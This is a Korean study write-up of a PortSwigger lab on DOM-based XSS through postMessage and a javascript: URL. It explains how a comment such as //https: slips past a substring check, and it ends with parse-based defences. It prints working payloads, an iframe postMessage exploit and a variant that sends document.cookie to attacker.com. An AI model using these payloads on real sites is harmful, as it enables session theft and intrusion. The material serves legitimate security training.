# Lab: DOM XSS using web messages and a JavaScript URL

## 개요

- **난이도**: Apprentice
- **주제**: DOM-based XSS — web messages / postMessage / javascript: URL / JS 주석 우회
- **링크**: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url

## 목표

메시지 핸들러가 수신 데이터를 `location.href` 에 설정하면서 `http:` / `https:` 포함 여부만 검증하는 취약점을 이용한다. `javascript:` URL 에 JS 주석(`//`)으로 `https:` 문자열을 포함시켜 검증을 우회하고 XSS를 실행한다.

## 001 랩과의 차이

```
[001 랩]
  싱크: innerHTML
  페이로드: <img src=1 onerror=print()>
  → HTML 태그 삽입으로 XSS

[002 랩 (이번)]
  싱크: location.href
  페이로드: javascript:print()//https:
  → javascript: URL 로 JS 실행
  추가 장벽: http/https 포함 여부 검증 → 주석으로 우회
```

## 취약한 메시지 핸들러

```javascript
// 타겟 사이트의 취약한 코드
window.addEventListener('message', function(e) {
    var url = e.data;
    // http 또는 https 포함 여부만 검사 (단순 문자열 검색)
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;  // ← javascript: URL 도 허용됨!
    }
});
```

```
의도:
  외부 메시지로 페이지 이동 기능 제공
  http/https URL 만 허용하려고 검증 추가

문제:
  'javascript:print()//https:'.indexOf('https:') > -1  → True!
  → 검증 통과
  → location.href = 'javascript:print()//https:'
  → javascript: URL 실행 → print() 호출
```

## javascript: URL 동작 원리

```
location.href = 'javascript:코드';

브라우저:
  javascript: 스킴 감지 → 페이지 이동 대신 JS 실행
  'javascript:alert(1)'   → alert(1) 실행
  'javascript:print()'    → print() 실행
  'javascript:fetch(...)'  → fetch 실행

정상 URL:
  location.href = 'https://example.com' → 페이지 이동
  location.href = 'javascript:...'      → JS 코드 실행
```

## JS 주석을 이용한 검증 우회

```javascript
// 페이로드: javascript:print()//https:

// JS 에서 // 이후는 주석 처리됨
javascript: print()  //https:
//           ↑실행    ↑주석 (실행 안 됨)

// 검증 로직 입장:
'javascript:print()//https:'.indexOf('https:') → 20 (> -1) → 통과!

// 브라우저 실행 입장:
// javascript: 스킴 → print() 실행
// //https:         → JS 주석 → 무시

// 결과: 검증은 통과하고, 실제로는 print() 실행
```

```
주석 우회 패턴:
  검증: url.indexOf('https:') > -1
  페이로드 구조: javascript:[실행할코드]//https:

  다른 변형:
  javascript:print()//http:
  javascript:alert(1)//https://dummy
  javascript:fetch('https://attacker.com?c='+document.cookie)//https:
```

## 공격 방법

### 페이로드

```html
<iframe
  src="https://VULNERABLE.com/"
  onload="this.contentWindow.postMessage('javascript:print()//https:','*')"
></iframe>
```

### 실행 흐름

```
1. iframe 으로 타겟 페이지 로드
2. onload 발화 → postMessage 전송:
   data: 'javascript:print()//https:'
3. 타겟 페이지 핸들러:
   url = 'javascript:print()//https:'
   url.indexOf('https:') > -1 → True → 검증 통과
   location.href = 'javascript:print()//https:'
4. 브라우저: javascript: 스킴 → print() 실행
```

## 001 랩과의 종합 비교

| 항목 | 001 랩 | 002 랩 (이번) |
|------|--------|--------------|
| 싱크 | `innerHTML` | `location.href` |
| 페이로드 형식 | HTML 태그 | `javascript:` URL |
| 추가 검증 | 없음 | `http/https` 포함 여부 |
| 우회 방법 | 없음 (바로 삽입) | JS 주석 `//https:` 추가 |
| XSS 실행 경로 | HTML 파싱 → onerror | JS URL 실행 → 직접 호출 |

## 핵심 정리

- `location.href` 에 `javascript:` URL 을 설정하면 JS 코드가 실행된다 — innerHTML 없이도 XSS 가능.
- 단순 문자열 포함 검증(`indexOf`)은 JS 주석(`//`)으로 우회할 수 있다.
- postMessage 수신 데이터를 `location.href` 에 설정할 때 `origin` 검증과 URL 스킴 검증이 모두 필요하다.
- **방어**:
  - `event.origin` 검증 (허용된 오리진만 처리)
  - URL 스킴 검증 시 문자열 포함이 아닌 **파싱 후 스킴 비교**:
    ```javascript
    const parsed = new URL(e.data);
    if (parsed.protocol === 'https:') location.href = e.data;
    ```
  - `javascript:` 스킴 명시적 차단

## 배운 점 및 추가 학습

### 1. location.href 의 XSS 싱크 특성

```javascript
// XSS 가능한 경우:
location.href = 'javascript:alert(1)';          // 직접 실행
location.href = userInput;                       // 사용자 입력 그대로

// XSS 불가능한 경우:
location.href = 'https://' + userInput;          // https: 강제 (안전)
location.href = encodeURIComponent(userInput);   // 인코딩 (안전)

// URL 파싱으로 안전하게 검증:
try {
    const url = new URL(userInput);
    if (['http:', 'https:'].includes(url.protocol)) {
        location.href = userInput;  // 안전
    }
} catch {
    // 유효하지 않은 URL → 무시
}
```

### 2. JS 주석 종류와 우회 활용

```javascript
// 한 줄 주석
// 이후 내용은 주석 처리

/* 블록 주석 */
/* 이 사이 내용은 주석 */

// 페이로드 활용:
javascript:alert(1)//검증통과문자열
javascript:alert(1)/*검증통과*/
javascript:alert(1)<!--검증통과-->  // HTML 주석도 JS에서 동작

// URL 검증 우회 패턴:
// 서버가 'evil.com' 차단하고 'safe.com' 허용 시:
// javascript:fetch('https://evil.com')//safe.com
```

### 3. DOM XSS 소스-싱크 매핑 (postMessage 관련)

```
소스: postMessage → event.data

싱크별 취약 패턴:
  innerHTML    = event.data  → HTML 삽입 → XSS (001 랩)
  location.href = event.data → JS URL 실행 → XSS (이번 랩)
  eval(event.data)           → JS 직접 실행 → XSS
  document.write(event.data) → HTML 삽입 → XSS
  src = event.data           → javascript: 가능 → XSS

안전한 싱크:
  textContent = event.data   → 텍스트만 → 안전
  setAttribute('data-x', event.data) → 데이터 속성 → 안전 (일반적으로)
```

### 4. URL 스킴 파싱 기반 검증

```javascript
// 취약한 검증 (문자열 포함):
if (url.includes('https:')) { ... }
// → 'javascript:alert()//https:' 우회 가능

// 안전한 검증 (URL 파싱):
try {
    const parsed = new URL(url);
    const allowedSchemes = ['https:', 'http:'];
    if (allowedSchemes.includes(parsed.protocol)) {
        location.href = url;
    }
} catch (e) {
    // URL 파싱 실패 → 거부
}

// URL 객체의 protocol 속성:
new URL('javascript:alert(1)').protocol  // → 'javascript:'  차단!
new URL('https://example.com').protocol  // → 'https:'       허용
new URL('javascript:alert()//https:').protocol  // → 'javascript:'  차단!
// ↑ 주석 우회도 파싱 기반에서는 통하지 않음
```
